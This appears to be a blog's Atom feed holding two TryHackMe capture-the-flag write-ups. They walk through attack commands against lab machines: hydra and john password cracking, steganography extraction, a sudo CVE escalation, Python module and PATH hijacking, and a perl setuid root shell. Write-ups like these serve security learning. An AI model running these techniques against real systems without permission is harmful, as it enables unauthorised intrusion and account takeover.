<?xml version="1.0" encoding="UTF-8"?>
<feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en">
    <title>Writups - stagenography</title>
    <subtitle>A diary dedicated to exploring the world of cybersecurity and technology.</subtitle>
    <link href="https://theanxiuser.github.io/writups/tags/stagenography/atom.xml" rel="self" type="application/atom+xml"/>
    <link href="https://theanxiuser.github.io/writups"/>
    <generator uri="https://www.getzola.org/">Zola</generator>
    <updated>2024-10-22T00:00:00+00:00</updated>
    <id>https://theanxiuser.github.io/writups/tags/stagenography/atom.xml</id>
    <entry xml:lang="en">
        <title>Agent Sudo - TryHackMe Writup</title>
        <published>2024-10-22T00:00:00+00:00</published>
        <updated>2024-10-22T00:00:00+00:00</updated>
        <author>
          <name>Unknown</name>
        </author>
        <link rel="alternate" href="https://theanxiuser.github.io/writups/chapters/agent-sudo/" type="text/html"/>
        <id>https://theanxiuser.github.io/writups/chapters/agent-sudo/</id>
        
        <content type="html">&lt;div style=&quot;display: flex; align-items: center;&quot;&gt;
  &lt;div&gt;
    &lt;img src=&quot;agent_sudo.png&quot; alt=&quot;Agent Sudo&quot; width=&quot;100&quot;&#x2F;&gt;
  &lt;&#x2F;div&gt;
  &lt;div style=&quot;margin-left: 10px;&quot;&gt;
    &lt;i&gt;You found a secret server located under the deep sea. Your task is to hack inside the server and reveal the truth.&lt;&#x2F;i&gt;
  &lt;&#x2F;div&gt;
&lt;&#x2F;div&gt;
&lt;h2 id=&quot;1-enumeration&quot;&gt;1. Enumeration&lt;&#x2F;h2&gt;
&lt;p&gt;Target IP: 10.10.165.175&lt;&#x2F;p&gt;
&lt;p&gt;There are 3 ports are open.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;code&gt;nmap 10.10.165.175 -v&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;pre&gt;
PORT   STATE SERVICE
21&#x2F;tcp open  ftp
22&#x2F;tcp open  ssh
80&#x2F;tcp open  http
&lt;&#x2F;pre&gt;
&lt;p&gt;The message shown in homepage, &lt;code&gt;http:&#x2F;&#x2F;10.10.165.175&#x2F;&lt;&#x2F;code&gt; is&lt;&#x2F;p&gt;
&lt;pre&gt;
Dear agents,

Use your own codename as user-agent to access the site.

From,
Agent R
&lt;&#x2F;pre&gt;
&lt;p&gt;It seems need to use &lt;code&gt;user-agent&lt;&#x2F;code&gt; as codename. The codename is from A to Z maybe, as there is shown Agent R. For that i will use BurpSuite.&lt;&#x2F;p&gt;
&lt;p&gt;I have inserted playod in &lt;code&gt;user-agent&lt;&#x2F;code&gt; from A to Z, and forwarded through intruder. &lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;theanxiuser.github.io&#x2F;writups&#x2F;chapters&#x2F;agent-sudo&#x2F;snipper_attack_burpsuite.png&quot; alt=&quot;alt text&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;Response length for C and R are different, for C less and for R more. By analyzing I found R have much content as&lt;&#x2F;p&gt;
&lt;pre&gt;
What are you doing! Are you one of the 25 employees? If not, I going to report this incident
	
Dear agents,
Use your own &lt;b&gt;codename&lt;&#x2F;b&gt; as user-agent to access the site.

From,
Agent R
&lt;&#x2F;pre&gt;
&lt;p&gt;But in case of C, there is status code &lt;code&gt;302&lt;&#x2F;code&gt; and the locetion is 
&lt;code&gt;Location: agent_C_attention.php&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;theanxiuser.github.io&#x2F;writups&#x2F;chapters&#x2F;agent-sudo&#x2F;response_user_agent_C.png&quot; alt=&quot;alt text&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;Now visit the location we found,&lt;&#x2F;p&gt;
&lt;pre&gt;
Attention chris,

Do you still remember our deal? Please tell agent J about the stuff ASAP. Also, change your god damn password, is weak!

From,
Agent R
&lt;&#x2F;pre&gt;
&lt;p&gt;The agent name is &lt;code&gt;chris&lt;&#x2F;code&gt; and it says the password is weak.&lt;&#x2F;p&gt;
&lt;h2 id=&quot;2-attack&quot;&gt;2. Attack&lt;&#x2F;h2&gt;
&lt;p&gt;Lets try out password crack for user cheris in FTP.
we will use hydra for attack and rockyou.txt for password list.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;code&gt;hydra -l chris -P &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt 10.10.165.175 ftp&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;theanxiuser.github.io&#x2F;writups&#x2F;chapters&#x2F;agent-sudo&#x2F;ftp_password_attack_result.png&quot; alt=&quot;alt text&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;After the successful login to FTP, we got &lt;&#x2F;p&gt;
&lt;pre&gt;
ftp&gt; ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 0        0             217 Oct 29  2019 To_agentJ.txt
-rw-r--r--    1 0        0           33143 Oct 29  2019 cute-alien.jpg
-rw-r--r--    1 0        0           34842 Oct 29  2019 cutie.png
226 Directory send OK.
&lt;&#x2F;pre&gt;
&lt;p&gt;All the files are download by simply &lt;code&gt;get&lt;&#x2F;code&gt; command.&lt;&#x2F;p&gt;
&lt;p&gt;The message says that the password is stored inside the image. So need to apply the concept to steganography.&lt;&#x2F;p&gt;
&lt;pre&gt;
❯ cat To_agentJ.txt
Dear agent J,

All these alien like photos are fake! Agent R stored the real picture inside your directory. Your login password is somehow stored in the fake picture. It shouldn&#x27;t be a problem for you.

From,
Agent C
&lt;&#x2F;pre&gt;
&lt;p&gt;Now, using &lt;code&gt;binwalk&lt;&#x2F;code&gt; and getting info if found.&lt;&#x2F;p&gt;
&lt;pre&gt;
❯ binwalk cute-alien.jpg

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             JPEG image data, JFIF standard 1.01

❯ binwalk cutie.png

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             PNG image, 528 x 528, 8-bit colormap, non-interlaced
869           0x365           Zlib compressed data, best compression
34562         0x8702          Zip archive data, encrypted compressed size: 98, uncompressed size: 86, name: To_agentR.txt
34820         0x8804          End of Zip archive, footer length: 22
&lt;&#x2F;pre&gt;
&lt;p&gt;Now extracting the cutie.png using &lt;code&gt;binwalk -e cutie.png&lt;&#x2F;code&gt; we have 365,  365.zlib and  8702.zip files, zip is important and is password protected.&lt;&#x2F;p&gt;
&lt;p&gt;Using &lt;code&gt;John The Ripper&lt;&#x2F;code&gt; to crack this password. First creating hash by &lt;code&gt;zip2john 8702.zip &amp;gt; zip_pass.hash&lt;&#x2F;code&gt; and then cracking the hash as&lt;&#x2F;p&gt;
&lt;pre&gt;
❯ john --wordlist=&#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt zip_pass.hash
.............
Press &#x27;q&#x27; or Ctrl-C to abort, almost any other key for status
ali**            (8702.zip&#x2F;To_agentR.txt)
1g 0:00:00:00 DONE (2024-10-08 17:45) 1.162g&#x2F;s 28576p&#x2F;s 28576c&#x2F;s 28576C&#x2F;s christal..280789
Session completed
&lt;&#x2F;pre&gt;
&lt;p&gt;Now we have zip password, extract it. The message found is &lt;&#x2F;p&gt;
&lt;pre&gt;
Agent C,

We need to send the picture to &#x27;QXJlYTUx&#x27; as soon as possible!

By,
Agent R
&lt;&#x2F;pre&gt;
&lt;p&gt;Here &lt;code&gt;QXJlYTUx&lt;&#x2F;code&gt; is encoded, lets decode using base64 as &lt;&#x2F;p&gt;
&lt;pre&gt;
echo &#x27;QXJlYTUx&#x27; | base64 -d
Area**
&lt;&#x2F;pre&gt;
&lt;p&gt;Now look into cute-alien.jpg, using &lt;code&gt;steghide&lt;&#x2F;code&gt;. After the command &lt;code&gt;steghide --info cute-alien.jpg&lt;&#x2F;code&gt;, we found that the &lt;code&gt;message.txt&lt;&#x2F;code&gt; file is embedded there.&lt;&#x2F;p&gt;
&lt;p&gt;Extracting it using &lt;code&gt;steghide --extract -sf cute-alien.jpg&lt;&#x2F;code&gt;. The message is &lt;&#x2F;p&gt;
&lt;pre&gt;
❯ cat message.txt
Hi jam**,

Glad you find this message. Your login password is hacker******

Don&#x27;t ask me why the password look cheesy, ask agent R who set this password for you.

Your buddy,
chris
&lt;&#x2F;pre&gt;
&lt;h2 id=&quot;3-capture-the-flag&quot;&gt;3. Capture the Flag&lt;&#x2F;h2&gt;
&lt;p&gt;Here we got SSH username and password. Now connect to it as
&lt;code&gt;ssh jam**@10.10.165.175&lt;&#x2F;code&gt;, got the user flag.
&lt;img src=&quot;https:&#x2F;&#x2F;theanxiuser.github.io&#x2F;writups&#x2F;chapters&#x2F;agent-sudo&#x2F;user_flag_poc.png&quot; alt=&quot;alt text&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;To know the incident of the photo &lt;code&gt;Alien_autospy.jpg&lt;&#x2F;code&gt; we need to download (maybe using scp) and search on google as&lt;&#x2F;p&gt;
&lt;p&gt;&lt;code&gt;scp jam**@10.10.165.175:&#x2F;home&#x2F;jam**&#x2F;Alien_autospy.jpg .&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;p&gt;By searching we found the image from &lt;code&gt;Roswell&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;h2 id=&quot;4-privilege-escalation&quot;&gt;4. Privilege Escalation&lt;&#x2F;h2&gt;
&lt;p&gt;Starting from &lt;code&gt;sudo -l&lt;&#x2F;code&gt;, found that user can run &#x2F;bin&#x2F;bash only as sudo. Now looking for sudo vulnerability for the version &lt;code&gt;1.8.21p2&lt;&#x2F;code&gt; (googling it.), we have CVE-2019-14***.&lt;&#x2F;p&gt;
&lt;p&gt;The exploit is &lt;code&gt;sudo ***** &#x2F;bin&#x2F;bash&lt;&#x2F;code&gt; (found in exploit-db) and we got&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;theanxiuser.github.io&#x2F;writups&#x2F;chapters&#x2F;agent-sudo&#x2F;root_flag_poc.png&quot; alt=&quot;alt text&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;Final message from Agent R is&lt;&#x2F;p&gt;
&lt;pre&gt;
To Mr.hacker,

Congratulation on rooting this box. This box was designed for TryHackMe. Tips, always update your machine. 

By,
Des*** a.k.a Agent R
&lt;&#x2F;pre&gt;
&lt;p&gt;Happy Hacking !!&lt;&#x2F;p&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>Wonderland - TryHackMe Writup</title>
        <published>2024-10-22T00:00:00+00:00</published>
        <updated>2024-10-22T00:00:00+00:00</updated>
        <author>
          <name>Unknown</name>
        </author>
        <link rel="alternate" href="https://theanxiuser.github.io/writups/chapters/wonderland/" type="text/html"/>
        <id>https://theanxiuser.github.io/writups/chapters/wonderland/</id>
        
        <content type="html">&lt;div style=&quot;display: flex; align-items: center;&quot;&gt;
  &lt;div&gt;
    &lt;img src=&quot;wonderland.jpeg&quot; alt=&quot;overpass&quot; width=&quot;100&quot;&#x2F;&gt;
  &lt;&#x2F;div&gt;
  &lt;div style=&quot;margin-left: 10px;&quot;&gt;
    &lt;i&gt;Fall down the rabbit hole and enter wonderland.&lt;&#x2F;i&gt;
  &lt;&#x2F;div&gt;
&lt;&#x2F;div&gt;
&lt;h2 id=&quot;scanning&quot;&gt;Scanning&lt;&#x2F;h2&gt;
&lt;p&gt;Target IP: 10.10.100.148&lt;&#x2F;p&gt;
&lt;p&gt;Scanning with nmap, we found two ports are open.&lt;&#x2F;p&gt;
&lt;pre&gt;
❯ nmap -sV 10.10.100.148 -v
Starting Nmap 7.95 ( https:&#x2F;&#x2F;nmap.org ) at 2024-10-17 14:49 +0545
.....
PORT   STATE SERVICE VERSION
22&#x2F;tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80&#x2F;tcp open  http    Golang net&#x2F;http server (Go-IPFS json-rpc or InfluxDB API)
Service Info: OS: Linux; CPE: cpe:&#x2F;o:linux:linux_kernel

.....
Nmap done: 1 IP address (1 host up) scanned in 39.25 seconds
&lt;&#x2F;pre&gt;
&lt;h2 id=&quot;enumeration&quot;&gt;Enumeration&lt;&#x2F;h2&gt;
&lt;p&gt;Enumerating port 80. Content in the home page is &lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;theanxiuser.github.io&#x2F;writups&#x2F;chapters&#x2F;wonderland&#x2F;home_page.png&quot; alt=&quot;alt text&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;To find out the directories, we will use gobuster as&lt;&#x2F;p&gt;
&lt;p&gt;&lt;code&gt;gobuster dir -u http:&#x2F;&#x2F;10.10.100.148&#x2F; -w &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;dirbuster&#x2F;directory-list-2.3-medium.txt&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;p&gt;In path &lt;code&gt;&#x2F;r&lt;&#x2F;code&gt;, we have the message&lt;&#x2F;p&gt;
&lt;pre&gt;
Keep Going.
&quot;Would you tell me, please, which way I ought to go from here?&quot;
&lt;&#x2F;pre&gt;
&lt;p&gt;We are not getting anything much, faced timeout error. Maybe there is something in the white rabit, as it says follow the white rabbit.&lt;&#x2F;p&gt;
&lt;p&gt;As we can see, there is &lt;code&gt;hint.txt&lt;&#x2F;code&gt; inside the image. Now extract and follow the hint.&lt;&#x2F;p&gt;
&lt;pre&gt;
❯ steghide --info white_rabbit_1.jpg
&quot;white_rabbit_1.jpg&quot;:
  format: jpeg
  capacity: 99.2 KB
Try to get information about embedded data ? (y&#x2F;n) y
Enter passphrase: 
  embedded file &quot;hint.txt&quot;:
    size: 22.0 Byte
    encrypted: rijndael-128, cbc
    compressed: yes
&lt;&#x2F;pre&gt;
&lt;p&gt;No need to pass passphrase, &lt;code&gt;steghide --extract -sf white_rabbit_1.jpg&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;p&gt;After following the path mentioned in the hint, we got the page&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;theanxiuser.github.io&#x2F;writups&#x2F;chapters&#x2F;wonderland&#x2F;open_the_door.png&quot; alt=&quot;alt text&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;Some content hidden is found there&lt;&#x2F;p&gt;
&lt;pre&gt;
alice:HowDothThe......HisShiningTail
    image src=&quot;&#x2F;img&#x2F;alice_door.png&quot;
&lt;&#x2F;pre&gt;
&lt;p&gt;Checking if the information is hidden in alice_door. There is nothing, maybe above hidden content is username and password for ssh. Lets try for this and here we go&lt;&#x2F;p&gt;
&lt;h1 id=&quot;gaining-access&quot;&gt;Gaining Access&lt;&#x2F;h1&gt;
&lt;p&gt;Here the root flag and user flag are in inverse place&lt;&#x2F;p&gt;
&lt;pre&gt;
Last login: Thu Oct 17 09:37:31 2024 from 10.17.58.84
alice@wonderland:~$ whoami
alice
alice@wonderland:~$ ls
root.txt  walrus_and_the_carpenter.py
alice@wonderland:~$ cat root.txt
cat: root.txt: Permission denied
alice@wonderland:~$ ls &#x2F;root
ls: cannot open directory &#x27;&#x2F;root&#x27;: Permission denied
alice@wonderland:~$ sudo ls &#x2F;root
[sudo] password for alice: 
Sorry, user alice is not allowed to execute &#x27;&#x2F;bin&#x2F;ls &#x2F;root&#x27; as root on wonderland.
alice@wonderland:~$ cat &#x2F;root&#x2F;user.txt
thm{&quot;Curiouser and curiouser!&quot;}
&lt;&#x2F;pre&gt;
&lt;h2 id=&quot;privilege-escalation&quot;&gt;Privilege Escalation&lt;&#x2F;h2&gt;
&lt;pre&gt;
alice@wonderland:~$ ls -l walrus_and_the_carpenter.py 
-rw-r--r-- 1 root root 3577 May 25  2020 walrus_and_the_carpenter.py
alice@wonderland:~$ sudo -l
[sudo] password for alice: 
Matching Defaults entries for alice on wonderland:
    env_reset, mail_badpass,
    secure_path=&#x2F;usr&#x2F;local&#x2F;sbin\:&#x2F;usr&#x2F;local&#x2F;bin\:&#x2F;usr&#x2F;sbin\:&#x2F;usr&#x2F;bin\:&#x2F;sbin\:&#x2F;bin\:&#x2F;snap&#x2F;bin

User alice may run the following commands on wonderland:
    (rabbit) &#x2F;usr&#x2F;bin&#x2F;python3.6 &#x2F;home&#x2F;alice&#x2F;walrus_and_the_carpenter.py
alice@wonderland:~$ cat walrus_and_the_carpenter.py 
import random
poem = &quot;&quot;&quot;The sun was shining on the sea,
Shining with all his might:
He did his very best to make
.....
And that was scarcely odd, because
They’d eaten every one.&quot;&quot;&quot;

for i in range(10):
    line = random.choice(poem.split(&quot;\n&quot;))
    print(&quot;The line was:\t&quot;, line)
&lt;&#x2F;pre&gt;
&lt;p&gt;We can run this file but can not edit. Here &lt;code&gt;random&lt;&#x2F;code&gt; module is imported. Lets make a random.py in the same directory with &lt;&#x2F;p&gt;
&lt;pre&gt;
import os

os.system(&quot;&#x2F;bin&#x2F;bash&quot;)
&lt;&#x2F;pre&gt;
&lt;p&gt;Running &lt;code&gt;sudo -u rabbit &#x2F;usr&#x2F;bin&#x2F;python3.6 &#x2F;home&#x2F;alice&#x2F;walrus_and_the_carpenter.py&lt;&#x2F;code&gt;, we are now &lt;code&gt;rabbit&lt;&#x2F;code&gt; user. Looking into home directory of rabbit we found a file &lt;code&gt;teaParty&lt;&#x2F;code&gt;.&lt;&#x2F;p&gt;
&lt;p&gt;SUID bit is on for teaParty&lt;&#x2F;p&gt;
&lt;pre&gt;
-rwsr-sr-x 1 root   root   16816 May 25  2020 teaParty
&lt;&#x2F;pre&gt;
&lt;p&gt;Running the file, we have following output. It shows that date command is executing so we can manipulate it.&lt;&#x2F;p&gt;
&lt;pre&gt;
rabbit@wonderland:&#x2F;home&#x2F;rabbit$ .&#x2F;teaParty 
Welcome to the tea party!
The Mad Hatter will be here soon.
Probably by Thu, 17 Oct 2024 11:08:04 +0000
Ask very nicely, and I will give you some tea while you wait for him
w
Segmentation fault (core dumped)
&lt;&#x2F;pre&gt;
&lt;p&gt;I have create date file with content &lt;code&gt;&#x2F;bin&#x2F;bash&lt;&#x2F;code&gt; and added it to the path by &lt;code&gt;export PATH=&#x2F;home&#x2F;rabbit:$PATH&lt;&#x2F;code&gt;. Now running the file, we are the hatter&lt;&#x2F;p&gt;
&lt;pre&gt;
rabbit@wonderland:&#x2F;home&#x2F;rabbit$ .&#x2F;teaParty 
Welcome to the tea party!
The Mad Hatter will be here soon.
Probably by hatter@wonderland:&#x2F;home&#x2F;rabbit$ whoami
hatter
&lt;&#x2F;pre&gt;
&lt;p&gt;I have password.txt file in the home directory of hatter, which is the password of user hatter. &lt;&#x2F;p&gt;
&lt;p&gt;By traversing into different user, we are not able to see the root flag. Now using linpeas for the further enumeration.&lt;&#x2F;p&gt;
&lt;p&gt;We have perl, that can be used to esclate privilege. Used GTFOBins for the exploit &lt;&#x2F;p&gt;
&lt;pre&gt;
hatter@wonderland:~$ perl -e &#x27;use POSIX qw(setuid); POSIX::setuid(0); exec &quot;&#x2F;bin&#x2F;sh&quot;;&#x27;
# 
# whoami
root
# cat &#x2F;home&#x2F;alice&#x2F;root.txt
thm{Twinkle, twinkle, .............. what you&#x27;re at!}
&lt;&#x2F;pre&gt;
&lt;p&gt;Thats all. This is more about the post enumeration and post exploitation things.&lt;&#x2F;p&gt;
&lt;p&gt;Happy Hacking !!&lt;&#x2F;p&gt;
</content>
        
    </entry>
</feed>
